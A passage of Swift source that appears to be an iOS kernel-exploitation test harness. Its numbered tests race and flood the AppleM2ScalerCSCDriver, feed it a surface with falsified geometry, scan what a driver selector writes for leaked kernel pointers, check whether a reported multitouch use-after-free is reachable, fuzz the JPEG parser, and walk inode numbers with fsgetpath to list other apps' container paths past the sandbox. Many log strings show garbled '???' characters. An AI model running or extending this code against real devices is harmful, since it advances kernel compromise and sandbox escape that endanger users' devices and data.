                var s: CVPixelBuffer?, d: CVPixelBuffer?
                CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA,
                                    attrs as CFDictionary, &s)
                CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                    kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &d)
                if let s, let d { _ = VTPixelTransferSessionTransferImage(session, from: s, to: d) }
            }
            VTPixelTransferSessionInvalidate(session)
            benchLine("     warm-up done")
        }

        let bgra: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64, .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: 256, .allocSize: 64 * 64 * 4,
        ]
        let yuv: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64,
            .pixelFormat: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
            .bytesPerElement: 1, .bytesPerRow: 64, .allocSize: 64 * 64 * 3 / 2,
        ]
        guard let srcS = IOSurfaceCreate(bgra as CFDictionary),
              let dstS = IOSurfaceCreate(yuv as CFDictionary) else { return }
        defer { _ = srcS; _ = dstS }
        let srcID = IOSurfaceGetID(srcS), dstID = IOSurfaceGetID(dstS)

        func service() -> io_service_t {
            guard let mm = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else { return 0 }
            var it: io_iterator_t = 0
            guard xq_IOServiceGetMatchingServices(0, mm, &it) == KERN_SUCCESS else { return 0 }
            let s = xq_IOIteratorNext(it)
            xq_IOObjectRelease(it)
            return s
        }

        var transformInput = [UInt8](repeating: 0, count: 0x1b0)
        withUnsafeBytes(of: srcID.littleEndian) { raw in
            for (i, b) in raw.enumerated() { transformInput[i] = b }
        }
        withUnsafeBytes(of: dstID.littleEndian) { raw in
            for (i, b) in raw.enumerated() { transformInput[4 + i] = b }
        }

        let transformCount = UnsafeMutablePointer<Int32>.allocate(capacity: 1)
        transformCount.pointee = 0
        let cycleCount = UnsafeMutablePointer<Int32>.allocate(capacity: 1)
        cycleCount.pointee = 0
        defer { transformCount.deallocate(); cycleCount.deallocate() }

        let workers = 6
        DispatchQueue.concurrentPerform(iterations: workers + 2) { index in
            if index < workers {
                // Worker: hold one connection and hammer the transform.
                let svc = service()
                guard svc != 0 else { return }
                var conn: io_connect_t = 0
                let kr = xq_IOServiceOpen(svc, mach_task_self_, 0, &conn)
                xq_IOObjectRelease(svc)
                guard kr == 0 else { return }
                for _ in 0..<40 {
                    var dsz = 0
                    var local = transformInput
                    local.withUnsafeBytes { ib in
                        _ = xq_IOConnectCallMethod(conn, 1, nil, 0, ib.baseAddress, 0x1b0,
                                                   nil, nil, nil, &dsz)
                    }
                    OSAtomicIncrement32Barrier(UnsafeMutableRawPointer(transformCount)
                        .assumingMemoryBound(to: Int32.self))
                }
                xq_IOServiceClose(conn)
            } else {
                // Churn: open and close clients while the workers are running.
                for _ in 0..<30 {
                    let svc = service()
                    guard svc != 0 else { continue }
                    var conn: io_connect_t = 0
                    let kr = xq_IOServiceOpen(svc, mach_task_self_, 0, &conn)
                    xq_IOObjectRelease(svc)
                    if kr == 0 {
                        xq_IOServiceClose(conn)
                        OSAtomicIncrement32Barrier(UnsafeMutableRawPointer(cycleCount)
                            .assumingMemoryBound(to: Int32.self))
                    }
                }
            }
        }

        benchLine("     transforms issued: \(transformCount.pointee)")
        benchLine("     open/close cycles during the run: \(cycleCount.pointee)")
        benchLine(transformCount.pointee > 0
                  ? "[OK] survived \(transformCount.pointee) concurrent transforms with churn"
                  : "[NO] no transform completed")
        benchLine("??? done")
    }

    // MARK: - test 41: scaler against a lying surface

    /// The scaler also has a public surface-level entry point. Our F1 surface
    /// declares a 4 GiB header region for a 64 KiB allocation; if the driver
    /// derives ring or descriptor sizes from that geometry, this is where it
    /// would matter.
    func bench41ScalerAccelerator() {
        benchLine("??? 41 ?? scaler against a lying surface")
        benchLine("     IOSurfaceAccelerator with a normal pair and with the F1 surface")

        var accel: UnsafeMutableRawPointer?
        let created = xq_IOSurfaceAcceleratorCreate(nil, nil, &accel)
        benchLine("     IOSurfaceAcceleratorCreate \(created) accel=\(accel == nil ? "nil" : "ok")")
        guard created == 0, let accel else { return }

        let bgra: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64, .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: 256, .allocSize: 64 * 64 * 4,
        ]
        let yuv: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64,
            .pixelFormat: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
            .bytesPerElement: 1, .bytesPerRow: 64, .allocSize: 64 * 64 * 3 / 2,
        ]
        guard let normalSrc = IOSurfaceCreate(bgra as CFDictionary),
              let normalDst = IOSurfaceCreate(yuv as CFDictionary) else {
            benchLine("[NO] surfaces"); return
        }
        defer { _ = normalSrc; _ = normalDst }

        func transfer(_ label: String, _ from: IOSurfaceRef, _ to: IOSurfaceRef) {
            var completion: UnsafeMutableRawPointer?
            let r = xq_IOSurfaceAcceleratorTransferSurface(accel, from, to, nil, &completion)
            benchLine("     \(label): \(r == 0 ? "ok" : "kr=\(r)")")
        }

        transfer("BGRA ??? 420v", normalSrc, normalDst)
        transfer("420v ??? BGRA", normalDst, normalSrc)
        transfer("BGRA ??? BGRA (same size)", normalSrc, normalSrc)

        // The F1 surface: declared 4 GiB header region, 64 KiB real allocation.
        guard let made = benchMakeSurface(headerPerSlice: 0x40000000) else {
            benchLine("[NO] F1 surface"); return
        }
        let (f1id, f1) = made
        benchLine("     F1 surface id=\(f1id) alloc=0x\(String(IOSurfaceGetAllocSize(f1), radix: 16))")

        transfer("F1 ??? 420v", f1, normalDst)
        transfer("F1 ??? BGRA", f1, normalSrc)
        transfer("BGRA ??? F1", normalSrc, f1)

        // A burst, in case the ring only misbehaves under load.
        var ok = 0
        for _ in 0..<32 where xq_IOSurfaceAcceleratorTransferSurface(accel, f1, normalDst, nil, nil) == 0 {
            ok += 1
        }
        benchLine("     burst F1 ??? 420v: \(ok)/32 ok")

        benchLine(ok >= 0 ? "[OK] survived the lying surface" : "[NO]")
        benchLine("??? done")
    }

    // MARK: - test 42: ring overflow attempt

    /// The reference analysis says the ring holds 16 entries and the flush scans
    /// a bitmap with a mask that is too wide, which can index beyond the array.
    /// This pushes far past 16 submissions with distinct payloads, interleaving
    /// property writes, to see whether the driver trips.
    func bench42ScalerOverflow() {
        benchLine("??? 42 ?? scaler ring overflow attempt")
        benchLine("     far more than 16 submissions with distinct payloads")

        var session: VTPixelTransferSession?
        if VTPixelTransferSessionCreate(allocator: kCFAllocatorDefault,
                                        pixelTransferSessionOut: &session) == noErr, let session {
            let attrs: [CFString: Any] = [kCVPixelBufferIOSurfacePropertiesKey: [:] as CFDictionary]
            for i in 0..<8 {
                let w = 64 + i * 32, h = 64 + i * 16
                var s: CVPixelBuffer?, d: CVPixelBuffer?
                CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA,
                                    attrs as CFDictionary, &s)
                CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                    kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &d)
                if let s, let d { _ = VTPixelTransferSessionTransferImage(session, from: s, to: d) }
            }
            VTPixelTransferSessionInvalidate(session)
            benchLine("     warm-up done")
        }

        let bgra: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64, .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: 256, .allocSize: 64 * 64 * 4,
        ]
        let yuv: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64,
            .pixelFormat: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
            .bytesPerElement: 1, .bytesPerRow: 64, .allocSize: 64 * 64 * 3 / 2,
        ]
        guard let srcS = IOSurfaceCreate(bgra as CFDictionary),
              let dstS = IOSurfaceCreate(yuv as CFDictionary) else { return }
        defer { _ = srcS; _ = dstS }
        let srcID = IOSurfaceGetID(srcS), dstID = IOSurfaceGetID(dstS)

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        defer { xq_IOServiceClose(conn) }

        func submit(tag: UInt64) -> kern_return_t {
            var input = [UInt8](repeating: 0, count: 0x1b0)
            withUnsafeBytes(of: srcID.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[i] = b }
            }
            withUnsafeBytes(of: dstID.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[4 + i] = b }
            }
            // Distinct payload so every ring entry is different.
            withUnsafeBytes(of: tag.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[0x10 + i] = b }
            }
            var dsz = 0
            var buf = input
            var kr: kern_return_t = -1
            buf.withUnsafeBytes { ib in
                kr = xq_IOConnectCallMethod(conn, 1, nil, 0, ib.baseAddress, 0x1b0, nil, nil, nil, &dsz)
            }
            return kr
        }

        func setProperty(_ value: UInt64) {
            var input = [UInt8](repeating: 0, count: 0x18)
            withUnsafeBytes(of: value.littleEndian) { raw in
                for (i, b) in raw.enumerated() { input[8 + i] = b }
            }
            var dsz = 0
            var probe = input
            probe.withUnsafeBytes { ib in
                _ = xq_IOConnectCallMethod(conn, 10, nil, 0, ib.baseAddress, 0x18, nil, nil, nil, &dsz)
            }
        }

        var ok = 0, failed = 0
        for i in 0..<256 {
            if i % 8 == 0 { setProperty(0xA000_0000 + UInt64(i)) }
            let kr = submit(tag: 0xB000_0000 + UInt64(i))
            if kr == 0 { ok += 1 } else { failed += 1 }
        }
        benchLine("     submissions: \(ok) ok, \(failed) failed")

        // A second wave immediately after, no flush in between.
        var ok2 = 0
        for i in 0..<128 {
            if submit(tag: 0xC000_0000 + UInt64(i)) == 0 { ok2 += 1 }
        }
        benchLine("     second wave: \(ok2)/128 ok")

        benchLine(ok > 0 ? "[OK] survived \(ok) submissions ??? the ring did not overflow visibly" : "[NO]")
        benchLine("??? done")
    }

    // MARK: - test 43: does selector 7 touch the buffer we point at

    /// Selector 7 accepts a user address and answers ok. We never checked whether
    /// it reads or writes the memory behind it. This fills a page with a pattern,
    /// passes its address, and compares the page afterwards.
    func bench43ScalerPointerEffect() {
        benchLine("??? 43 ?? scaler pointer effect")
        benchLine("     fill a page, pass its address to sel 7, inspect the page afterwards")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        defer { xq_IOServiceClose(conn) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case 1: return "INVAL_ADDR"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            default: return "kr=\(kr)"
            }
        }

        // Two mapped pages, so a write past the first one is visible.
        let pages = UnsafeMutableRawPointer.allocate(byteCount: 0x8000, alignment: 0x4000)
        defer { pages.deallocate() }

        func call(addr: UInt64) -> kern_return_t {
            var bytes = withUnsafeBytes(of: addr.littleEndian, Array.init)
            while bytes.count < 8 { bytes.append(0) }
            var dsz = 0
            var kr: kern_return_t = -1
            bytes.withUnsafeBytes { ib in
                kr = xq_IOConnectCallMethod(conn, 7, nil, 0, ib.baseAddress, 8, nil, nil, nil, &dsz)
            }
            return kr
        }

        func snapshot() -> [UInt8] {
            let p = pages.bindMemory(to: UInt8.self, capacity: 0x8000)
            return Array(UnsafeBufferPointer(start: p, count: 0x8000))
        }

        let patterns: [(String, UInt64)] = [
            ("zeros", 0),
            ("one", 1),
            ("0x1000", 0x1000),
            ("0xffff_ffff", 0xffff_ffff),
            ("kernel-looking", 0xffff_fff0_0700_4000),
        ]

        for (label, first) in patterns {
            memset(pages, 0xCC, 0x8000)
            // Put the pattern at the head of the page.
            let head = pages.bindMemory(to: UInt64.self, capacity: 1)
            head[0] = first
            let before = snapshot()
            let kr = call(addr: UInt64(UInt(bitPattern: pages)))
            let after = snapshot()

            var changed = 0
            var firstChange = -1
            for i in 0..<after.count where before[i] != after[i] {
                changed += 1
                if firstChange < 0 { firstChange = i }
            }
            let tail = after[0x4000..<0x8000].contains { $0 != 0xCC }
            benchLine("     \(label): \(name(kr)) ?? \(changed) byte(s) changed"
                      + (firstChange >= 0 ? " at +0x\(String(firstChange, radix: 16))" : "")
                      + (tail ? " ?? second page touched" : ""))
        }

        // Also point at the very last 8 bytes of the first page, so an
        // over-read or over-write crosses into the next page.
        memset(pages, 0xCC, 0x8000)
        let edge = UInt64(UInt(bitPattern: pages)) + 0x4000 - 8
        let beforeEdge = snapshot()
        let krEdge = call(addr: edge)
        let afterEdge = snapshot()
        var changedEdge = 0
        for i in 0..<afterEdge.count where beforeEdge[i] != afterEdge[i] { changedEdge += 1 }
        benchLine("     page edge: \(name(krEdge)) ?? \(changedEdge) byte(s) changed")

        benchLine(changedEdge == 0
                  ? "[NO] sel 7 does not write through the pointer"
                  : "[OK] sel 7 writes through the pointer ??? that is a channel")
        benchLine("??? done")
    }

    // MARK: - test 44: dump what selector 7 writes

    /// sel 7 writes about 1536 bytes through the pointer we give it. That data
    /// comes from the driver. This dumps it and scans for kernel pointers, which
    /// would be a leak of exactly the kind we have been looking for.
    func bench44ScalerPointerData() {
        benchLine("??? 44 ?? what selector 7 writes")
        benchLine("     0x800 scratch page ?? dump and kernel-pointer scan")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        defer { xq_IOServiceClose(conn) }

        let size = 0x1000
        let buf = UnsafeMutableRawPointer.allocate(byteCount: size, alignment: 16)
        defer { buf.deallocate() }

        memset(buf, 0xCC, size)
        var addr = UInt64(UInt(bitPattern: buf))
        var dsz = 0
        var kr: kern_return_t = -1
        withUnsafeBytes(of: addr.littleEndian) { raw in
            var bytes = Array(raw)
            bytes.withUnsafeBytes { ib in
                kr = xq_IOConnectCallMethod(conn, 7, nil, 0, ib.baseAddress, 8, nil, nil, nil, &dsz)
            }
        }
        benchLine("     sel 7 kr=\(kr)")

        let bytes = buf.bindMemory(to: UInt8.self, capacity: size)
        let written = 0x600
        var changed = 0
        for i in 0..<size where bytes[i] != 0xCC { changed += 1 }
        benchLine("     bytes written: \(changed) of \(size)")

        // Head dump.
        var off = 0
        while off < min(written, 0x100) {
            var word: UInt64 = 0
            for i in 0..<8 { word |= UInt64(bytes[off + i]) << (8 * i) }
            benchLine("     +0x\(String(format: "%03x", off)): 0x\(String(format: "%016llx", word))")
            off += 8
        }

        // Kernel pointer scan over everything that changed.
        var kptrs: [(Int, UInt64)] = []
        var p = 0
        while p + 8 <= size {
            var v: UInt64 = 0
            for i in 0..<8 { v |= UInt64(bytes[p + i]) << (8 * i) }
            if v >= 0xFFFF_8000_0000_0000 && v < 0xFFFF_FFFF_0000_0000 {
                kptrs.append((p, v))
            }
            p += 8
        }
        benchLine("     kernel pointers: \(kptrs.count)")
        for (o, v) in kptrs.prefix(10) {
            benchLine("          +0x\(String(format: "%03x", o)): 0x\(String(format: "%016llx", v))")
        }

        // Non-zero words that are not pointers: may be ids or sizes.
        var numbers: [(Int, UInt64)] = []
        p = 0
        while p + 8 <= min(written, 0x200) {
            var v: UInt64 = 0
            for i in 0..<8 { v |= UInt64(bytes[p + i]) << (8 * i) }
            if v != 0 && v != 0xCCCC_CCCC_CCCC_CCCC && !(v >= 0xFFFF_8000_0000_0000) {
                numbers.append((p, v))
            }
            p += 8
        }
        if !numbers.isEmpty {
            benchLine("     non-zero words:")
            for (o, v) in numbers.prefix(12) {
                benchLine("          +0x\(String(format: "%03x", o)): 0x\(String(format: "%llx", v))")
            }
        }

        _ = addr
        benchLine("??? done")
    }

    // MARK: - test 45: selector 7 with the context alive

    /// The 1536 bytes selector 7 writes were all zero ??? but the call ran without a
    /// scaler context, so there was nothing to report. This warms the scaler first
    /// and dumps the same structure again.
    func bench45ScalerPointerAfterWarm() {
        benchLine("??? 45 ?? selector 7 with a live context")

        var session: VTPixelTransferSession?
        if VTPixelTransferSessionCreate(allocator: kCFAllocatorDefault,
                                        pixelTransferSessionOut: &session) == noErr, let session {
            let attrs: [CFString: Any] = [kCVPixelBufferIOSurfacePropertiesKey: [:] as CFDictionary]
            for i in 0..<8 {
                let w = 64 + i * 32, h = 64 + i * 16
                var s: CVPixelBuffer?, d: CVPixelBuffer?
                CVPixelBufferCreate(kCFAllocatorDefault, w, h, kCVPixelFormatType_32BGRA,
                                    attrs as CFDictionary, &s)
                CVPixelBufferCreate(kCFAllocatorDefault, w, h,
                                    kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                    attrs as CFDictionary, &d)
                if let s, let d { _ = VTPixelTransferSessionTransferImage(session, from: s, to: d) }
            }
            VTPixelTransferSessionInvalidate(session)
            benchLine("     warm-up done")
        }

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        defer { xq_IOServiceClose(conn) }

        // Do a real transform first so the client has state to report.
        let bgra: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64, .pixelFormat: kCVPixelFormatType_32BGRA,
            .bytesPerElement: 4, .bytesPerRow: 256, .allocSize: 64 * 64 * 4,
        ]
        let yuv: [IOSurfacePropertyKey: Any] = [
            .width: 64, .height: 64,
            .pixelFormat: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
            .bytesPerElement: 1, .bytesPerRow: 64, .allocSize: 64 * 64 * 3 / 2,
        ]
        if let a = IOSurfaceCreate(bgra as CFDictionary),
           let b = IOSurfaceCreate(yuv as CFDictionary) {
            var input = [UInt8](repeating: 0, count: 0x1b0)
            let sid = IOSurfaceGetID(a), did = IOSurfaceGetID(b)
            withUnsafeBytes(of: sid.littleEndian) { raw in
                for (k, v) in raw.enumerated() { input[k] = v }
            }
            withUnsafeBytes(of: did.littleEndian) { raw in
                for (k, v) in raw.enumerated() { input[4 + k] = v }
            }
            var dsz = 0
            input.withUnsafeBytes { ib in
                _ = xq_IOConnectCallMethod(conn, 1, nil, 0, ib.baseAddress, 0x1b0,
                                           nil, nil, nil, &dsz)
            }
            benchLine("     transform done")
            _ = a; _ = b
        }

        let size = 0x1000
        let buf = UnsafeMutableRawPointer.allocate(byteCount: size, alignment: 16)
        defer { buf.deallocate() }
        memset(buf, 0xCC, size)

        var addr = UInt64(UInt(bitPattern: buf))
        var tailSize = 0
        withUnsafeBytes(of: addr.littleEndian) { raw in
            var bytes = Array(raw)
            bytes.withUnsafeBytes { ib in
                _ = xq_IOConnectCallMethod(conn, 7, nil, 0, ib.baseAddress, 8, nil, nil, nil, &tailSize)
            }
        }

        let bytes = buf.bindMemory(to: UInt8.self, capacity: size)
        var changed = 0
        for i in 0..<size where bytes[i] != 0xCC { changed += 1 }
        benchLine("     bytes written: \(changed)")

        var nonzero: [(Int, UInt64)] = []
        var kptrs: [(Int, UInt64)] = []
        var p = 0
        while p + 8 <= size {
            var v: UInt64 = 0
            for i in 0..<8 { v |= UInt64(bytes[p + i]) << (8 * i) }
            if v != 0 && v != 0xCCCC_CCCC_CCCC_CCCC {
                if v >= 0xFFFF_8000_0000_0000 && v < 0xFFFF_FFFF_0000_0000 {
                    kptrs.append((p, v))
                } else {
                    nonzero.append((p, v))
                }
            }
            p += 8
        }
        benchLine("     kernel pointers: \(kptrs.count) ?? non-zero words: \(nonzero.count)")
        for (o, v) in kptrs.prefix(8) {
            benchLine("          kptr +0x\(String(format: "%03x", o)): 0x\(String(format: "%016llx", v))")
        }
        for (o, v) in nonzero.prefix(10) {
            benchLine("          word +0x\(String(format: "%03x", o)): 0x\(String(format: "%llx", v))")
        }

        benchLine(changed > 1536 ? "[?] more than the usual 1536 bytes written" : "[OK] same size")
        benchLine("??? done")
    }

    // MARK: - test 46: multitouch user client

    /// A UAF was reproduced on macOS 27 in
    /// AppleMultitouchDeviceUserClient::setSendsFrames by toggling selector 0 from
    /// three threads. This checks whether the same client is reachable on iOS and
    /// what selector 0 answers before any stress is attempted.
    func bench46Multitouch() {
        benchLine("??? 46 ?? multitouch user client")
        benchLine("     macOS 27 had a UAF in setSendsFrames (selector 0)")

        let candidates = ["AppleMultitouchDevice", "AppleMultitouchDriver",
                          "AppleMultitouchSPI", "AppleMultitouchHIDEventDriver"]
        var found: [(String, io_service_t)] = []

        for cls in candidates {
            guard let m = cls.withCString({ xq_IOServiceMatching($0) }) else { continue }
            var it: io_iterator_t = 0
            guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { continue }
            var svc = xq_IOIteratorNext(it)
            var count = 0
            while svc != 0 {
                if count == 0 { found.append((cls, svc)) }
                count += 1
                var next = xq_IOIteratorNext(it)
                if next != svc { xq_IOObjectRelease(svc) }
                svc = next
            }
            xq_IOObjectRelease(it)
            benchLine("     \(cls): \(count) instance(s)")
        }

        guard !found.isEmpty else {
            benchLine("[NO] no multitouch service matched")
            return
        }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case 1: return "INVAL_ADDR"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870199: return "NotPermitted"
            case -536870208: return "NotPrivileged(0x2C1)"
            default: return "kr=\(kr)"
            }
        }

        for (cls, svc) in found {
            for type in UInt32(0)...2 {
                var conn: io_connect_t = 0
                let kr = xq_IOServiceOpen(svc, mach_task_self_, type, &conn)
                benchLine("     \(cls) open(type \(type)): \(name(kr))")
                guard kr == 0 else { continue }
                defer { xq_IOServiceClose(conn) }

                // Selector 0 with a scalar, the shape the report describes.
                for value in [UInt64(0), 1, 2] {
                    var scalar = value
                    var outScalars = [UInt64](repeating: 0, count: 8)
                    var scount: UInt32 = 8
                    let skr = xq_IOConnectCallScalarMethod(conn, 0, &scalar, 1, &outScalars, &scount)
                    benchLine("          sel 0 value \(value): \(name(skr)) out=\(outScalars[0])")
                }
            }
        }

        benchLine("     a reachable client with an accepted selector 0 is the precondition")
        benchLine("??? done")
    }

    // MARK: - test 47: image decoder surfaces

    /// Codec and image parsers take attacker-controlled bytes, which is a better
    /// class of target than an inert property interface. This checks whether the
    /// JPEG service exposes a user client at all.
    func bench47JPEGSurface() {
        benchLine("??? 47 ?? image decoder surfaces")
        benchLine("     AppleJPEGDriver and neighbours ?? parser takes our bytes")

        let candidates = ["AppleJPEGDriver", "AppleJPEG", "AppleJPEG2",
                          "AppleAVD", "AppleAVDUserClient", "AppleProResHW"]
        var found: [String] = []

        for cls in candidates {
            guard let m = cls.withCString({ xq_IOServiceMatching($0) }) else { continue }
            var it: io_iterator_t = 0
            guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { continue }
            var svc = xq_IOIteratorNext(it)
            var count = 0
            while svc != 0 {
                count += 1
                var next = xq_IOIteratorNext(it)
                if next != svc { xq_IOObjectRelease(svc) }
                svc = next
            }
            xq_IOObjectRelease(it)
            if count > 0 { found.append(cls) }
            benchLine("     \(cls): \(count) instance(s)")
        }

        guard !found.isEmpty else {
            benchLine("[NO] no image service matched"); return
        }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870199: return "NotPermitted"
            case -536870208: return "NotPrivileged"
            default: return "kr=\(kr)"
            }
        }

        for cls in found {
            guard let m = cls.withCString({ xq_IOServiceMatching($0) }) else { continue }
            var it: io_iterator_t = 0
            guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { continue }
            let svc = xq_IOIteratorNext(it)
            xq_IOObjectRelease(it)
            guard svc != 0 else { continue }
            var marks: [String] = []
            for type in UInt32(0)...3 {
                var conn: io_connect_t = 0
                let kr = xq_IOServiceOpen(svc, mach_task_self_, type, &conn)
                if kr == 0 {
                    marks.append("type \(type): ok")
                    xq_IOServiceClose(conn)
                } else {
                    marks.append("type \(type): \(name(kr))")
                }
            }
            xq_IOObjectRelease(svc)
            benchLine("     \(cls) ??? \(marks.joined(separator: ", "))")
        }

        benchLine("??? done")
    }

    // MARK: - test 48: in-process image parser campaign

    /// Decoding crafted images exercises the image parser with bytes we choose.
    /// This mutates header fields of a valid JPEG and decodes each one, so a
    /// failure shows up as a crash with the mutation recorded in the log.
    func bench48ImageCampaign() {
        benchLine("??? 48 ?? image parser campaign")

        // Build a small valid JPEG to mutate.
        let side = 32
        let ctx = CGContext(data: nil, width: side, height: side, bitsPerComponent: 8,
                            bytesPerRow: side * 4, space: CGColorSpaceCreateDeviceRGB(),
                            bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)
        guard let ctx, let img = { () -> CGImage? in
            ctx.setFillColor(CGColor(red: 0.4, green: 0.7, blue: 0.2, alpha: 1))
            ctx.fill(CGRect(x: 0, y: 0, width: side, height: side))
            return ctx.makeImage()
        }() else { benchLine("[NO] base image"); return }

        let data = NSMutableData()
        guard let dest = CGImageDestinationCreateWithData(data, "public.jpeg" as CFString, 1, nil) else {
            benchLine("[NO] jpeg encoder"); return
        }
        CGImageDestinationAddImage(dest, img, nil)
        CGImageDestinationFinalize(dest)
        let base = data as Data
        benchLine("     base JPEG \(base.count) bytes")

        // Header-focused mutation: the first 512 bytes carry the segment tables.
        var decoded = 0, failed = 0
        let rounds = 400
        for round in 0..<rounds {
            var bytes = [UInt8](base)
            let head = min(512, bytes.count)
            // Mutate a few positions per round, deterministic per round number.
            var seed = UInt64(round &* 2654435761 &+ 12345)
            for _ in 0..<4 {
                seed = seed &* 6364136223846793005 &+ 1442695040888963407
                let pos = Int(seed % UInt64(head))
                bytes[pos] = UInt8((seed >> 33) & 0xFF)
            }
            // Keep the SOI marker so the parser proceeds.
            if bytes.count > 2 { bytes[0] = 0xFF; bytes[1] = 0xD8 }

            let d = Data(bytes)
            if let src = CGImageSourceCreateWithData(d as CFData, nil),
               let _ = CGImageSourceCreateImageAtIndex(src, 0, nil) {
                decoded += 1
            } else {
                failed += 1
            }
            if round % 100 == 0 {
                benchLine("     round \(round): decoded=\(decoded) failed=\(failed)")
            }
        }
        benchLine("     finished: decoded=\(decoded) failed=\(failed) of \(rounds)")
        benchLine("[OK] the parser survived \(rounds) mutated images")
        benchLine("??? done")
    }

    // MARK: - test 49: container path disclosure via fsgetpath

    /// fsgetpath resolves an inode to a full path on a volume. Walking inode
    /// numbers from inside our own container lists the paths of sibling
    /// containers, which the sandbox is not supposed to disclose.
    func bench49PathLeak() {
        benchLine("??? 49 ?? container path disclosure")
        benchLine("     fsgetpath inode walk against our own container prefix")

        let home = NSHomeDirectory()
        benchLine("     container: \(home)")

        // Prefix to match: everything up to the trailing uuid, kept with the slash.
        var prefix = home
        if prefix.hasSuffix("/") { prefix.removeLast() }
        benchLine("     prefix: \(prefix)")

        var sfs = statfs()
        guard statfs(prefix, &sfs) == 0 else {
            benchLine("[NO] statfs failed"); return
        }
        let fsid = sfs.f_fsid
        benchLine("     fsid: \(fsid.val.0)/\(fsid.val.1)")

        var buffer = [CChar](repeating: 0, count: 1024)
        var found: [String] = []
        let maxInode: UInt64 = 400_000
        let prefixLen = prefix.utf8.count

        let started = Date()
        for inode in 1...maxInode {
            var fs = fsid
            let n = buffer.withUnsafeMutableBufferPointer { bp -> Int in
                withUnsafePointer(to: &fs) { fp in
                    xq_fsgetpath(bp.baseAddress, bp.count, fp, inode)
                }
            }
            if n <= 0 { continue }
            let path = String(cString: buffer)
            if path.hasPrefix(prefix) && path.count > prefixLen {
                let rest = path.dropFirst(prefixLen)
                if rest.hasPrefix("/"), !rest.dropFirst().contains("/") {
                    found.append(path)
                }
            }
        }
        let elapsed = Date().timeIntervalSince(started)
        benchLine("     inodes scanned: \(maxInode) in \(String(format: "%.1f", elapsed))s")
        benchLine("     sibling containers found: \(found.count)")
        for p in found.prefix(8) {
            benchLine("          \(p)")
        }

        // The wider target: all application containers on this volume.
        var appFound: [String] = []
        let appPrefix = "/private/var/mobile/Containers/Data/Application/"
        for inode in 1...maxInode {
            var fs = fsid
            let n = buffer.withUnsafeMutableBufferPointer { bp -> Int in
                withUnsafePointer(to: &fs) { fp in
                    xq_fsgetpath(bp.baseAddress, bp.count, fp, inode)
                }
            }
            if n <= 0 { continue }
            let path = String(cString: buffer)
            if path.hasPrefix(appPrefix) {
                let rest = path.dropFirst(appPrefix.count)
                if !rest.contains("/") { appFound.append(path) }
            }
        }
